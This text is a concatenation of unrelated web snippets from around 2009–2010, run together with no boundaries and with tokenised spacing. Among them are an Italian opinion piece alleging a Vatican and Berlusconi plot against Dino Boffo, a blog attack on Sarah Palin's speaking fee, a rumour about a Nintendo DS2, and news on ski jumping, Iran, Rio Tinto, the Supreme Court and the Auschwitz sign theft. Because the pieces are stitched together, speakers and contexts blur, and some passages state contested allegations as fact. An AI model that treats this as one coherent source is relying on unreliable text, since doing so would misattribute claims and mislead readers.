Huranga , a game played between men and women on the day after Holi , involves men drenching women with liquid colors and women tearing off the men ’s clothes .
[ Craig Ferguson voice ] “ I knooooow ! ”
Factor in that practically everybody involved is high as a freakin’ kite , and got -DANG if that does n’t sound exactly like my kind of party .

Hot on the heels of the recent DSi XL appearance , rumors are swirling that Nintendo is preparing to announce a second version of the DS -- the DS2 , if you will -- at E3 in June .
Over on RPad they 're spilling the beans about the supposed device , including the fact that it 'll boast two larger , higher resolutions screens , an accelerometer , and it will also supposedly run on an NVIDIA Tegra chip .
Finally , RPad is also reporting that they spoke with developers who say their games will be finished by the end of the year ... leading us all to speculate the unannounced successor could , possibly , be announced at E3 , then available by the end of the year .
Of course , this info's all 100 percent unofficial , so take everything with a grain of salt , relax , and we 'll let you know as soon as we hear something more solid .
Il Cavaliere , il Vaticano
e la congiura contro Boffo
di GIUSEPPE D'AVANZOC'E ' STATO , dunque , dentro le gerarchie di Santa Romana Chiesa una cospirazione .
Il segretario di Stato , Tarcisio Bertone , muove contro la Conferenza Episcopale Italiana di Angelo Bagnasco .
Francesco Cossiga - con l'occhio lungo di chi è abituato a vedere nel sottofondo dei poteri - rivela le ragioni per tempo .
Il presidente emerito della Repubblica , adeguatamente informato , anticipa tutti , quasi disegna nel minuto ciò che accadrà presto , le teste che cadranno , le forze in campo , la posta politica in gioco .
Berlusconi è sotto tiro .
Ci si è cacciato da solo , in un angolo , festeggiando una minorenne .
La sua vita sconveniente piace poco o punto alle parrocchie e ai parroci , che non tacciono imbarazzo e amarezza in lettere all 'Avvenire .
Il monsignor Mariano Crociata , segretario generale della Cei , ascolta quelle voci e lamenta : " Assistiamo a un disprezzo esibito nei confronti di tutto ciò che dice pudore , sobrietà , autocontrollo e allo sfoggio di un libertinaggio gaio e irresponsabile che invera la parola lussuria .
Nessuno deve pensare che in questo campo non ci sia gravità di comportamenti o che si tratti di affari privati ; soprattutto quando sono implicati minori , cosa la cui gravità grida vendetta al cospetto di Dio " ( 6 luglio , Ferriera di Latina ) .
Cossiga prende di petto il segretario della Cei : " Si è passato il segno .
Altro che " festini e libertinaggio " : sarebbe bastata una dichiarazione sull ' etica , riferita alla situazione generale , come si è sempre fatto " .
Insistere su questi temi , ragiona Cossiga , svela " una spaccatura che riguarda la politica , non l'etica " .
Ecco la scena che egli vede : " Vogliono tenersi buona una parte dell 'episcopato e del movimento ecclesiale , vicino al centro - sinistra .
Hanno puntato sul Pd di Franceschini , tirano la volata all ' unico leader post -dc rimasto .
Se il direttore dell ' Avvenire vanta che , all ' interno del suo giornale , ognuno decide liberamente a chi devolvere l'8 per mille , siamo in presenza di un gruppo in dissidenza non con il centro - destra , ma potenzialmente con la parte della Chiesa che fa capo al Papa " .
Cossiga è brutale con il direttore dell '
Avvenire : " Non riesco a dare nessuna spiegazione agli scritti del non reverendo Boffo che , posto inopportunamente alla direzione del giornale pur sempre organo ufficiale della Cei , dovrebbe astenersi da questi continui attacchi , dovuti in parte alle sue note preferenze politiche , ammantate da scelte religiose " ( il Giornale , 24 agosto ) .* * * Le parole di Francesco Cossiga raccontano a chi ha orecchie per intendere ( 1 ) perché il giornale del capo del governo colpisce qualche giorno dopo Dino Boffo ; ( 2 ) per chi suona la campana della sua character assassination ; ( 3 ) chi deve trarre vantaggio dallo scandalo che è già in cottura .
Berlusconi è in bilico , pericolosamente fragile .
Lo rendono vulnerabile le sue abitudini .
Lo indeboliscono i comportamenti privati .
Ancor più lo debilitano le reazioni paralizzate che oscillano dalla menzogna pubblica a un silenzio impotente , screditandolo sulla scena internazionale e tra il suo elettorato .
Lo segnalano i sondaggi .
I consiglieri politici che gli sono accanto comprendono che , se anche i vescovi italiani gli muoveranno pubblicamente contro - come lascia credere l'intervento del segretario della Cei - il capo del governo sarà fritto , la sua stagione politica arriverà a un triste capolinea .
In questo campo di tensioni politiche , religiose e linee di forza , più schiettamente , di potere , il direttore dell ' Avvenire Dino Boffo diventa il magnete che attrae l'intero spettro delle reazioni alla situazione critica ; l'obiettivo contro cui si scarica il desiderio della Curia romana di regolare i conti con un episcopato reso troppo autonomo dalle politiche di Camillo Ruini ; la volontà del segretario di Stato Tarcisio Bertone di sostenere il periclitante Silvio Berlusconi e di riprendere nelle sue mani la guida della Chiesa italiana ; la determinazione del Cavaliere ad aggredire " colpo su colpo " , chiunque - familiare , alleato , oppositore , editore , giornalista - gli si pari davanti , critico .
Scannare Dino Boffo , come sempre accade al capro espiatorio , è una lucidissima necessità terapeutica .
È un esercizio che aggira le contraddizioni che non si riescono a risolvere ( può una Chiesa che chiede " pudore , sobrietà , autocontrollo " affidarsi a un " libertino irresponsabile " ? ) .
È la manovra che consente di rinviare la soluzione del problema ( possono i cattolici italiani guardare con fiducia e rispetto a Berlusconi ? ) .
È la mossa che può liquidare dal proscenio un " uomo- istituzione " , per di più laico , cui i gerarchi ecclesiali , con il rancore di molti , hanno affidato il governo dell ' intero media - system cattolico , l'Avvenire , Sat 2000 , la televisione sulla quale la Cei riversa importanti risorse , InBlu , il network radiofonico di ben 200 radio .
Sul capo di Dino Boffo si precipitano un odio e un risentimento assoluti .
Si intravedono molte mani al lavoro e sempre le loro mosse sono intenzionali .* * * Sulla scena appaiono ora i congiurati .
Sono stati chiamati in causa , in questi giorni .
Bisogna dirne il nome e il cognome .
Sono il segretario di Stato , Tarcisio Bertone .
Il direttore dell ' Osservatore romano , Gian Maria Vian .
Le informazioni distruttive si possono raccogliere , fabbricare o distorcere isolando un fatto vero dal suo contesto e manipolandolo con cura .
È la politica dello scandalo .
Ha i suoi protocolli .
Vengono rispettati anche in questo caso .
Per distruggere Dino Boffo , i congiurati hanno a disposizione una muffa .
La si conosce da cinque anni : una condanna penale per molestie che il direttore dell '
Avvenire , per proteggere un suo assistente , ha accettato rifiutando il giudizio e l'appello .
Può non bastare ( è roba già vista , è aria fritta ) e , dunque , grazie ai buoni uffici di un qualche spione ( secondo fonti vicine a Boffo , un professore dell ' Università Cattolica di Milano ) , " Sua Eccellenza " chiede informazioni .
Le riceve .
Trenta righe , precedute dalla dicitura " Riscontro a richiesta di informativa di Sua Eccellenza " .
Nel testo si legge la calunnia che taglierà la testa al capro espiatorio ricomponendo l'ordine compromesso : " Il Boffo è un noto omosessuale già attenzionato dalla Polizia di Stato per questo genere di frequentazioni e gode indubbiamente di alte protezioni , correità e coperture in sede ecclesiastica " .
Il veleno assassino è pronto .
Ora bisogna provocare una " fuga di notizie " rimanendo fuori della mischia e lasciando che il lavoro sporco sia completato dai giornali .* * * L'azione intenzionale di chi , " primo ministro " ( Bertone ) , pretende un riequilibrio di poteri che ridimensioni l'autonomia della " Chiesa nazionale italiana " , perché " non ci possono essere " piccoli vaticani " sparsi nei cinque continenti " ( Vittorio Messori ) , incrocia il disegno del presidente del Consiglio che , in estate , ha riorganizzato la sua " mischia mediatica " , ha deciso di muovere contro i suoi avversari , autentici e presunti .
Ha stilato una lista di nemici e vuole demolirli .
Licenzia quelli tra i suoi che gli appaiono incerti .
Vuole sicari pronti a sporcarsi le mani .
Che il piano sia questo , lo svela Mario Giordano , costretto a lasciare la direzione del Giornale : " Nelle battaglie politiche non ci siamo certi tirati indietro (...)
Ma quello che fanno le persone dentro le loro camere da letto ( siano essi premier , direttori di giornali , editori , ingegneri , first lady , body guard o avvocati ) riteniamo siano solo fatti loro .
E siamo convinti che i lettori del Giornale non apprezzerebbero una battaglia politica che non riuscisse a fermare la barbarie e si trasformasse nel gioco dello sputtanamento sulle rispettive alcove " ( il Giornale , 21 agosto ) .
Giordano non poteva essere più chiaro : l'editore e premier mi ha chiesto di fare del mio quotidiano una bottega di miasmi , per decenza non me la sono sentita e lascio l'incarico a chi quel lavoro sporco è disposto a farlo .
Vittorio Feltri , il nuovo arrivato , è disposto , altro che .
Scrive che " il suo fucile è carico " .
Gian Maria Vian lo avvicina .
Gli fa consegnare il dossier manipolato , " autenticandolo " .
Lo rassicura : è un'iniziativa voluta dal cardinale Bertone .
A delitto consumato , il segretario di Stato telefonerà a Feltri ( secondo una confidenza sfuggita a Boffo con i suoi collaboratori ) ringraziandolo per " aver reso un servizio alla Chiesa e al Papa " .
Ma non è la Chiesa che il direttore del Giornale vuole servire .
Egli è al servizio del suo editore e di una nuova strategia politica che altera il giornalismo in calunnia .
Una tecnica di minacciosa disinformazione che vuole terrorizzare gli avversari politici , intimorire tutti affinché chiunque smarrisca " la serenità di lavorare " e i giornalisti " la possibilità di raccontare senza doversi aspettare ritorsioni " ( Roberto Saviano ) .
Quando ascolta Vian , il nuovo direttore sa bene qual è la sua missione .
Non si prende nemmeno la briga di dare un'occhiata a quelle carte false ( falsa è la " nota informativa " che offrirà al suo pubblico come documento giudiziario ) .
Le pubblica .
È il 28 agosto del 2009 .
Dopo cinque mesi la menzogna che , nel mondo meraviglioso di Silvio Berlusconi , nasconde la realtà vuole farci credere che l'" assassinio " di Dino Boffo è stato ideato e consumato soltanto nelle stanze vaticane .
Dovremmo dimenticare oggi che sulla scena di quel delitto ci sono anche le impronte del Cavaliere .
La character assassination del direttore di Avvenire ( mai illuminata nei mandanti e nei moventi da alcun giornale ) è l'esito di due azioni intenzionali che , come Cossiga ci ha spiegato in anticipo , sono state organizzate per dare " a ciascuno , il suo " .
A Tarcisio Bertone il governo ( anche politico ) dell 'episcopato italiano .
A Silvio Berlusconi , una via d'uscita da guai che , con l'abbandono della Chiesa , potevano travolgerne il destino .
Una eccellente occasione di rappresentarsi come un potere che , nelle difficoltà , non avrebbe rinunciato a mostrare - con i dossier , l'intimidazione , di lì a poco colpiranno Napolitano , Fini , la Corte Costituzionale - la violenza pura che custodisce .
Acknowledging the relationship between Microsoft and the open source community has been contentious , a Microsoft official Thursday nonetheless emphasized the company 's embrace of the open source paradigm , even if it was not necessarily for altruistic purposes .
The presentation by Microsoft's Stuart McKee , who holds the title of national technology officer for the United States , continued a pattern in recent years that has seen Microsoft publicly embracing the open source movement and even funding it .
[ Read InfoWorld blogger Zack Urlocker 's take on Microsoft 's open source glasnost . ]
" [ Microsoft feels ] strongly that Microsoft 's success has been based on the fact that we can run a lot of diverse technologies on the Microsoft platform including open source , " McKee said .
Microsoft has had a " contentious " relationship with open source proponents but " things are really changing , " he said .
McKee , who focuses on governmental customers for Microsoft , offered his perspectives in a keynote speech at the OSBC ( Open Source Business Conference ) in San Francisco .
Microsoft contributes to open source efforts , including sponsoring Linux , he said .
Microsoft has contributed 20,000 lines of device driver code to the Linux kernel so Linux can run on Microsoft 's Hyper - V virtualization technology , noted Robert Duffner , Microsoft director of open source strategy , who also was present at OSBC .
" To be quite honest , it 's not that we 're altruistic , necessarily .
Our key desire is to satisfy customers .
We build software for a living -- that ' what we do , " McKee said .
" And we understand profoundly that a diverse ecosystem is absolutely critical to satisfying the needs of customers and increasingly , that ecosystem does include open source . "
Among other examples of Microsoft 's embrace of open source cited by McKee included the Microsoft.web site for the Microsoft Web platform , which features 23 open source applications out of a total of 25 applications .
Also , Apache software , the MySQL database , and PHP all run on Microsoft 's Windows Azure cloud platform , McKee said .
Microsoft in recent years has been endorsing open source via efforts such as sponsoring the Apache Foundation .
The Microsoft - backed CodePlex Foundation , meanwhile , was set up last year as an effort to enable collaboration between open source communities and software companies .
Prior to McKee 's appearance , David Recordon , head of open source initiatives at Facebook , stressed the emphasis on open source software on the site .
" We rely on the Varnish project .
Varnish is an incredible open source cache , " Recordon said .
Billions of requests are served through Varnish everyday around the world on Facebook , he said .
To boost PHP performance on the site , Facebook developed an open source technology , HipHop for PHP , which transforms PHP code into highly optimized C++ , said Recordon .
Facebook also uses the open source Memcached distributed memory object caching system and the MySQL database , Recordon said .
Memcached , he said , " is sort of like that magic pixie dust " for scalability .
" We really use MySQL as our data store , " offering data integrity , decent backup tools and reliability , Recordon said .

They did not riot .
They did not threaten Congress with guns , pitchforks or revolution .
They did not spit on members of congress or hurl bigoted abuse at them .
They did not declare hate for the President .
They do n’t claim that he is an usurper .
They hold respect for him and the position he occupies .
They love America .
They are the true patriots .
They are the people that clean up the shit in the bath rooms , clean the dishes in restaurants and change the dirty sheets at hotels .
For that , they get mistreated , get no contract jobs , get no recourse from the Government , get no back up from the police if mugged or worse .
They are not even included in the health care reforms just passed .
Despite all of that , they still love America .
It is time for America to deliver on an ancient promise .
Not like the brazen giant of Greek fame ,
With conquering limbs astride from land to land ;
Here at our sea- washed , sunset gates shall stand
A mighty woman with a torch , whose flame
Is the imprisoned lightning , and her name
Mother of Exiles .
From her beacon- hand
Glows world - wide welcome ; her mild eyes command
The air - bridged harbor that twin cities frame .
“ Keep , ancient lands , your storied pomp ! ” cries she
With silent lips .
“ Give me your tired , your poor ,
Your huddled masses yearning to breathe free ,
The wretched refuse of your teeming shore .
Send these , the homeless , tempest - tossed to me ,
I lift my lamp beside the golden door !
There is a " " set to be held in Nashville , Tennessee from February 4th - 6th 2010 .
The list of sponsors of this event , organized by Tea Party Nation , is a bunch of groups that I would think might be a little more logical and reasoning than they are , since most are of a conservative nature .
Update * * *
Palin tells Bill O'Reilly she will not be receiving a fee
* * *
Logic and reason have been thrown out the window in this country though and it's not just coming from the left and their adulation of the " charismatic and dynamic " Barack Obama that blinded everyone 's eyes to his actual stances on issues .
Now on the right logic and reason have been discarded and they are blinded by a few super - personalities that dress the right way , say clever things and speak in certain tones .
Underneath it all though is nothing more than trying to emotionally drive people to give them money and it's not about the movements they say they are supporting .
Enter one Sarah Palin .
Palin , an attractive woman who oozes charisma that makes people want to like her and support her , has taken to the Tea Party movement like a duck to water .
Jumping on the backs of a grassroots anger coming from the hard working producers of this country she has manipulated them in ways I did n't think possible .
Since her choosing as vice - presidential candidate to John McCain she has been lauded as the second coming of Reagan by those on the right .
In the end though Palin has basically gained support the same way that Barack Obama did , through celebrity , image and glossiness .
Yet when you dig down into Sarah Palin you find a dark side .
It 's the vogue more than the rogue .
It has now been reported by Palin supporter and conservative Dan Riehl that Palin will be charging the Tea Party Convention $ 100 k for her Saturday Night Keynote address .
This just appalls me and should raise red flags to anyone who thinks she is supporting the tea party movement simply because of their values and principles .
After selling millions of books and making millions of dollars , Sarah Palin is now on the warpath to make every single dollar she can before she self destructs and people turn on her .
Do n't get me wrong , I like Sarah Palin personally and I really did want to support her , but when she coddled up to John McCain a red flag of logic and reason went up in me that overcame the emotion driven thoughtlessness .
I instantly started digging into her stances on immigration .
After all , if this is going to be the " second in command " of our nation - and possible president if McCain should die in office - she better have a good firm stance on what she would do about the 20 million illegal aliens in this country and a good solid idea what to do with the open borders to our country .
Finding nothing I was shocked at the support she was receiving ( and continues to receive ) .
Having no stance on this issue is basically endorsing it as something not important .
It is complicit in allowing it to continue .
Finally all of my suspicions were confirmed when Palin gave an interview to Univision where she states that she was for a pathway to citizenship for illegal aliens in October 2008 , just days before the election .
It should be noted that one of the sponsors of the Tea Party Convention is the Federation for American Immigration Reform ( FAIR ) .
They should pull out in protest as should any other groups and individuals opposed to amnesty .
It 's important to get your message out there , but not if it sacrifices your principles and beliefs .
Another absolute warning sign of Palin 's intentions is when she resigned from being governor of Alaska .
She claimed that she could do more without being burdened by being governor and the weight of public office .
This to me smacked more of avoiding potential mistakes she might make that would end her career .
It seemed less about being for a movement as she claimed .
She has very little experience and the chance she had to receive any she tossed away .
She has chosen to remain inexperienced rather than prove her worth .
Since that time she has made a roadshow selling her book Going Rogue and taking hip - shots from her website making a few endorsements here and there to candidates .
Her golden touch of celebrity politician giving a boost to those so lucky and her blind followers not questioning things as they trot along behind .
The final breaking point for me on Palin is this $ 100 k speaking fee .
How outrageous and asinine do people have to be to believe that she is simply for the movement and the cause ?
Who can believe , other than the simply blind and emotion - driven sheep , that she would die for her principles ?
That to her it is more important to save this country from creeping socialism than it is to give a speech to those fighting the good fight on their saved up lunch money ?
No , for Sarah Palin it is not simply about the cause , it is not simply about the values and principles , it is about exposure and making more than a typical Tea Partier makes in a year giving a speech to them about how great they are for supporting her .
She 'll tell them how she 's behind them all the way as she siphons off a little of their cash that they could be putting to better use by organizing to continue the fight .
It is more about her getting hers before the movement fades away and her star dims with it .
Can people in this country please wake up ?
You are committing all of your acts and movements based simply on emotion .
You are committing the same cardinal sin that you accused Obama followers of .
It is the death of this nation to continue on this path .
I am quite simply disgusted by it .
WAKE UP and use your brain !
Palin should be chastised for using this grassroots movement for a paycheck .
It is more of the same self - promoting and " self before country " action that congress has taken and that every Tea Partier I have met has been vehemently against .

The Following 9 Users Say Thank You to kwotski For This Useful Post :
WHISTLER , British Columbia  Coach Jochen Danenberg was walking toward the bottom of the jumping hill at the Whistler Olympic Park on Friday when he spotted a familiar face across the fence .
Alissa Johnson , an American ski jumper who holds 10th place in the world rankings for women , was standing on the side reserved for spectators .
“ Where are your skis ? ” Danenberg , the American coach , asked as he leaned over to give Johnson a kiss on the cheek .
She arched an eyebrow and kissed him back .
“ Yeah , right ? ” she said .
Johnson would have loved to have strapped on her skis and taken a shot at the big hill Friday , but women ski jumpers are not competing at the Vancouver Olympics .
Despite years of protests and a court case that went all the way to the Canadian Supreme Court , the International Olympic Committee barred women from competing in ski jumping , arguing that the sport is too early in its development to field enough qualified competitors .
Instead , Johnson , who is 22 , watched as a sister and supporter , cheering on her younger brother , Anders , a member of the men ’s team , as he competed in the qualification round on the large hill .
Anders Johnson , 20 , failed to qualify for the medal round on Saturday after jumping 117 meters to finish in 42nd place , two positions below the cut .
He is recovering from surgery in August to repair a torn anterior cruciate ligament .
The Vanderburgh County , Indiana , County Prosecutor is trying to save the children by banning anything above a " G " rating from Redbox , and other inexpensive , automated video rental systems — going so far as to backhandedly threaten a grocery store with a Class D felony .
But , as Consumerist points out , the real " brains " behind this effort is n't parents , or even a particularly zealous religious group .
It 's video rental stores , which stand to profit if $ 1 - per - DVD - per - day Redbox can't dispense anything other than cartoons .
Jan. 29 , 2010  -- President Obama 's public undressing of the robed Supreme Court justices seated in front of him at the State of the Union address turned heads and drew rebukes from Republicans .
But his words were downright genteel compared with what 's been said on the Senate floor the past two days .
Democrats on Capitol Hill accused conservative court members of deciding cases specifically to benefit the Republican Party .
Criticism of the court by lawmakers is nothing new , and those tensions are exactly why the American system of government enshrines a separation of powers between the three branches of government .
But Democratic senators seem to have declared political war on the Supreme Court .
Sen. Sheldon Whitehouse , D - R.I. , for instance , said on the Senate floor Friday that he sees the court 's recent decision to allow unfettered corporate and union spending on elections ( though not as direct aid to candidates ) as an overt bid by the majority conservative bloc to pursue " Republican political goals . "
Whitehouse pointed to the recent decision recognizing corporations as having the same right to free speech as individuals .
" Connect the dots , " said Whitehouse .
" Republicans are the party of the corporations .
The judges are the appointees of the Republicans , and the judges just delivered for the corporations .
It is being done in plain view . "
In the wake of that decision , Sen. Chuck Schumer , D - N.Y. , said , " The Supreme Court just predetermined the winners of next November 's elections . "
Schumer , who was in charge of Democrats ' successful Senate election strategy in 2006 and 2008 , has teamed with Rep.
Chris van Hollen , who ran a similar effort for House Democrats in 2008 and is still in charge of their election efforts , to write legislation to essentially undo the court 's decision .
Whitehouse also described recent interpretations of the 2nd Amendment inventing " a new individual constitutional right to bear arms that no previous Supreme Court had noticed for more than 200 years … "
Senate Majority Leader Harry Reid will more obliquely demonstrate liberal frustration with the Supreme Court at a photo op Friday .
He plans to appear with Lilly Ledbetter , an icon of liberal frustration with the Supreme Court .
She is the former Goodyear Tire employee whose discrimination suit was not factually disputed , but overturned by the Supreme Court on a technicality about when exactly the statute of limitations should run out on her case .
Democrats in Congress passed The Lilly Ledbetter Fair Pay Act in 2009 to counter that decision .
It was the first piece of legislation President Obama signed into law .
" There can be little doubt that the conservative bloc is laying the foundation for future right - wing activism in a seemingly deliberate and concerted effort to expand its political philosophy into our law , " said Whitehouse on the Senate floor , adding , " and , of course , always , always , always the dramatic changes observably fall in the direction of the Republican Party 's current political doctrine . "
He was more direct in his speech : " One bedrock principle in our democracy is that the will of the people should be supreme , except in very limited circumstances .
In the judicial context , this means that courts should hesitate before striking down statutes enacted by congress , but it seems that that 's not so when core tenets of the Republican platform are involved .
And it 's not just this one case .
There is a pattern that is discernible when these five men get together to strike down laws of congress they do n't like and make new law more to their liking .
The pattern is not just discernible , it is unmistakable , it is undeniable .
It appears , indeed , to be without exception . "
On Thursday , Sen. Patrick Leahy , the Vermont Democrat who chairs the Senate Judiciary Committee , called the ruling on corporate election spending a " threat to the rule of law " and said it is one example of " a willingness of a narrow majority of the Supreme Court to render decisions from the bench to suit their own ideological agenda . "
" It 's something that every one of us as Americans have to work to ensure that the system of checks and balances envisioned by the founders is not cast aside by the whimsical preferences of five justices overriding the rights of 300 million Americans , " said Leahy .
Six people arrested in December protests will be put to death , Iranian authorities announced Monday , in what appeared to be strong warning to the opposition ahead of a traditional annual celebration .
The tradition , the Feast of Fire , goes back thousands of years to Zoroastrian times and has been banned in Iran in recent decades because of its non-Islamic roots .
The opposition had called for its celebration this year as a sign of protest .
The supreme leader , Ayatollah Ali Khamenei , issued a decree saying the feast “ has no religious basis and is harmful and must be avoided , ” the government Web site reported .
The celebration includes jumping over fires in the evening , followed by the Iranian version of trick - or - treating , when young people cover themselves head to toe in chadors and bang spoons on pots as they knock on neighbors ’ doors for candy .
Two men who had also received death sentences for their part in the December protests were executed last month , just ahead of another holiday , the 31st anniversary of the Islamic revolution .
China has reacted angrily to Australia 's criticism of the corruption trial of businessman Stern Hu and his Rio Tinto colleagues .
Prime Minister Kevin Rudd and Foreign Minister Stephen Smith say there are " serious unanswered questions " about the evidence used to convict
Hu , who is an Australian citizen , on a charge of stealing commercial secrets .
The charge was heard in secret and no official evidence has been made public .
When the ABC asked Chinese foreign ministry spokesman Qin Gang for his reaction to the comments , there was an angry reply .
" We express serious concern about the Australian statements on the Rio Tinto case , " Mr Qin said .
" The Rio case is a criminal case and the Chinese side has already given its verdict .
" Australia should respect this outcome and stop making irresponsible comments . "
Mr Qin also refused to timetable when China would ratify a prisoner exchange agreement it has made with Australia that would potentially allow Hu to serve part of his sentence in Australia .
Hu and three Chinese colleagues , who were tried last week in Shanghai , were convicted of accepting bribes totalling about $ 14 million and stealing trade secrets .
Hu , who headed Rio Tinto 's Shanghai office , was sentenced to 10 years in prison , while Wang Yong , Ge Minqiang and Liu Caikui were given jail terms of 14 , eight and seven years , respectively .
Rio Tinto has now sacked the men , saying their actions are totally at odds with the company 's strong ethical culture .
' Harsh ' sentence
Mr Smith described Hu's 10 - year jail sentence as harsh by anyone 's measure and said the Government was disappointed with several aspects of the trial .
" On the bribery charge , this to me seems to be a very harsh sentence , " he said .
" And on the commercial secrets matter , because we 've had no access to that part of the trial , there are serious unanswered questions which the international business community will want to continue to pursue with China . "
Prime Minister Kevin Rudd also said there were serious doubts about the conviction on the charge of obtaining commercial secrets .
" When it comes to bribery , the Australian Government 's position is consistent .
We condemn bribery wherever it occurs , " Mr Rudd said .
" The trial on the second charge was held in secret with no media and no Australian officials present for it .
" This has left , therefore , serious unanswered questions about this conviction .
And holding this part of the trial in secret , China , I believe , has missed an opportunity to demonstrate to the world at large transparency that would be consistent with its emerging global role . "

Anyone who watched AC Milan at Old Trafford could see that their once great squad has aged a great deal in the past few years and as they are currently constructed they struggle to compete against top - end teams .
They suffered massive blows with a number of injuries to key players , but that also served to highlight how they lack the depth to compete when injuries occur .
It is painfully obvious that Milan needs to invest in new talent if they expect to compete in the next few years .
While they have invested a great deal in their youth sector this year , many of those players wo n’t develop , and it will take years for them to become viable starters , if they ever reach that level .
A lot of money will need to be invested if AC Milan is to become a world - class team again .
Here is my plan to accomplish this goal :
Step 1 — Fix the Stadium Situation
While the San Siro is a great venue , it is getting old , and it is n’t owned by the club , so they do n’t receive full ticket proceeds and they cannot make money for renting the field out for concerts or other events .
Between not owning the stadium and sharing it with Inter , Milan loses a lot of potential revenue .
The recent financial success of the German League correlates with them modernizing their stadiums .
Step 2 — Out With the Old
As much as the current generation of AC Milan stars have meant to the club over the past decade , it is time to clean out a lot of the squad while they still have some value to other clubs .
Others need to retire , and others need to be released .
The entire makeup of the club ca n’t change , but their needs to be a massive overhaul .
Retire
Pippo Inzaghi
— He has been a very important player for the club scoring many important goals , but this season he has not been that good when he has played , and he is frustrated with his minutes .
It is either time for him to retire or join another club .
Giuseppe Favalli
— He used to be a good backup defender , currently he is far too slow to play for a top club , and he should strongly consider hanging his boots up .
Release / Let Walk
Dida — Had a few good games this year , but is n’t the player he once was .
Not good enough to play for a top - flight club , and there is talk of him wanting to return to play in Brazil .
Massimo Oddo— Very helpful in Milan ’s 2007 Champion ’s League victory , but his play has declined a great deal over the past few years .
Time to go .
Sell
Ronaldinho — While he has been an important player for Milan this season , against big teams his many flaws have shown through .
He rarely runs hard and he loses the ball often while trying to do tricks .
His inability to play behind the strikers has forced Milan to play a 4 - 3 - 3 this season , which puts Pato in a position that he is not ideally suited for , and well as making the team less balanced overall .
I think that his play will continue to tail off as he ages , and that Milan should capitalize on his run of good form and his marketability to a team like Man City .
( 30 million Euros . )
Clarence Seedorf — Another great player that is not what he used to be .
He is a true champion , but at the present he lacks the ability to be an every - game starter in a top league .
However , he still brings a lot to the table , and a team like Ajax , where he started his career , could use the boast that a great example of how to be a true professional .
( Eight to 10 million Euros . )
Gennaro Gattuso — Yet another former world - class player that is not what he once was .
He no longer has the lung - bursting energy that once helped make him great , he wants to play , but Flamini seems to have taken his spot for good reason .
He is said to want to play in England , and I could see Ancelotti and him reuniting in London .
( Six million Euros . )
Kakhaber Kaladze — While he seems to be an old player , he is still in his early 30s .
He has fallen out of favor in Milan , but he is still in demand in Germany and in Russia .
There are rumors that some teams are interested in him for somewhere in the area of six to eight million Euros .
Klaas Jan Huntelaar — Never really got a chance to settle in at Milan .
He has played pretty well when given a chance , but he has n’t gotten many , which means he will likely move on .
There are a number of English , Spanish , and German teams that have an interest in him .
This could lead to his sale for 15 to 20 million Euros .
Marco Stoari — Played great for Milan at the beginning of the year , after he was loaned to Sampdoria he has played very well again and they want to keep him .
His sale should earn Milan around five or six million Euros .
Marek Jankulovski— While he is technically a left back , his defensive skills are pretty poor , and he is better suited to play in the midfield these days .
He is n’t as good as he once was and no longer plays at a high enough level to start at Milan .
He is worth around five million Euros .
Oguchi Onyewu — Was brought in for free to attempt to bolster the team ’s support in the United States .
When he played in the preseason he was n’t very good in the system Milan plays ( it requires more mobility than he has ) and then he got injured and has been out for the last few months .
He should be able to get Milan three to four million Euros .
Step 3 — In With the New
After the roster has been purged of the players that have been underachieving and are just not working at Milan , new players will need to be brought in .
To go along with the approximately 80 million Euro that was generated in player sales , the new deal Milan made with Fly Emirates gives them about 15 million for this year , and making the knockout round of the Champions League gives them an additional 20 million .
This brings the “ war chest ” to around 115 million , although not all of this money will be spent on players , as the leftover money will likely go into the new stadium .
Return From Loan
Davide Astori — Has played well with Cagalri this season , and if he wants to return to be the fifth centerback he would be a welcome addition .
It may be worth letting him stay out on loan to continue developing .
Free Transfers
Mario Yepes — Milan are heavily linked to the Colombian defender .
He is 34 years old , but he has a lot of experience and would take Favalli ’s spot as the veteran reserve defender and would serve as the fifth centerback .
Cacau — A Brazilian - born German international player that has played well this past season .
He would be an excellent backup striker for Pato .
Purchase
Edin Dzeko —
In all honesty , this move should have been made last year .
Dzeko is a huge Milan supporter and badly wants a transfer to the Italian club .
His wish should be granted as he is one of the best young center forwards in the world .
Playing to next to Pato should mean lots of goals for both of them .
He is rumored to have a 25 million Euro buyout clause .
Javier Pastore — A very exciting attacking midfielder , he has adapted very well to Italy this past season .
He should only continue to improve , as he is n’t even 21 years old yet .
Milan have been tracking him for a while and he would allow for them to play a very balanced 4 - 3 - 1 - 2 , as he is a willing runner and tracks back to help the defense out .
He cost Palermo about five million Euro , so a bid of around 12 should land him .
Simon Kjaer — Another huge talent from Palermo , the young Dane is also not even 21 yet , and he has all the qualities to become the best centerback in the world .
He could learn a lot playing on the same team as Alessandro Nesta , and he would start a number of games when Nesta needs a rest .
Kjaer can still improve and a move to Milan would be a big step in that direction .
He would likely cost around 16 million Euros , or about four times more than they paid for him .
Anderson Hernanes — One of the most talented midfielders in Brazil , he has been rumored to Milan for a few years now .
He won best player in the Brazilian League for the ' 08-09 season , and he can play all over the midfield .
He is said to cost about 15 million .
Gregory van der Wiel — A hugely talented young right back , he is a starter for Ajax and the Dutch National Team and he is only 22 .
One of the most promising attacking right backs in Europe right now , and Ajax could use the money .
A deal with them to send them Seedorf and some cash ( four million ) may do the trick .
Diego Alves — A talented keeper that will only be 25 next season .
While he was born in Brazil , he has Italian citizenship so he will not take a non -EU spot for next season .
Alves has been one of the best keepers in La Liga , and he has done it while playing behind a poor defense in Almeria .
Would cost seven million .
Alessandro Rosina — A very talented attacking mid , Rosina was Torino ’s captain , and put the team on his back and almost kept them in Serie A , but his team fell just short .
He has played in Russia this season , and I think he would welcome a move back to Italy .
Would cost seven million .
Andrea Poli— A young midfielder that plays a lot like Andrea Pirlo , and he could be groomed to eventually take for him in Milan ’s midfield .
He has played very well this year , and if Sampdoria are not willing to let him leave this term , he could be bought and loaned there for the next season .
If in Milan however he adds great depth and can learn a lot from Pirlo .
Cost : Stoari and five million .
New Starting Lineup
( new players in caps )
— ALVES
— VAN DER WIEL — Nesta — Silva — Antonini
— Flamini — Pirlo ( C ) — HERNANES
— PASTORE
— Pato — DZEKO
Backups
— Abbiati
— Abate — Bonera — KJAER — Zambrotta
— Flamini — POLI — Ambrosini ( C )
— ROSINA
— CACAU — Borriello
Hundreds of thousands of people passed under the sign to their deaths
Polish police are using a sniffer dog in their search for thieves who took the infamous Arbeit Macht Frei sign over the entrance to Auschwitz .
Detectives and other police officers were sent to the site of the former Nazi camp where more than one million people , mostly Jewish , were murdered .
A replica of the sign , which translates as " Work Sets You Free " , has been put up temporarily .
The theft on Friday has caused outrage in Israel , Poland and elsewhere .
